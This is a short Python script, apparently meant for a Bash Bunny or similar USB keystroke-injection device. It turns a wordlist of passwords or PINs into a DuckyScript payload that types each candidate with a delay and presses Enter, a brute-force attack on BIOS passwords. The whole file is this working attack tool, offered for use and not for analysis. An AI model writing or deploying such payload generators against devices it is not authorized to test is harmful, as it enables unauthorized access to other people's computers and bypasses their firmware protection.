#Bash bunny brute force 

import sys

print("EX. Create-ducky.py {your input file}.txt outfile.txt 2\n")
print("required arguments are [input file] [output file] [delay in seconds]\n")
#setting files to read and write
fin = sys.argv[1]
fout = sys.argv[2]
tin = int(sys.argv[3])
#reading password or pin file in
f = open(fin, "r")
s = open(fout , "a")
#setting up duckyscript head ATTACKMODE might not be needed depending on device
s.write ("REM python created ducky script for brute forcing bios passwords\n")
s.write ("ATTACKMODE HID\n")
#setting time in seconds for delay
t = tin * 1000
#print(t)
#main script for writing to file 
with open(fin, "r") as f, open(fout, "a") as s:
    # Main script for writing to file
    for line in f:
        stripped_line = line.strip()
        if stripped_line:  # Only write non-empty lines
            s.write("DELAY " + str(t) + "\n")
            s.write("STRING " + stripped_line + "\n")
            s.write("ENTER\n")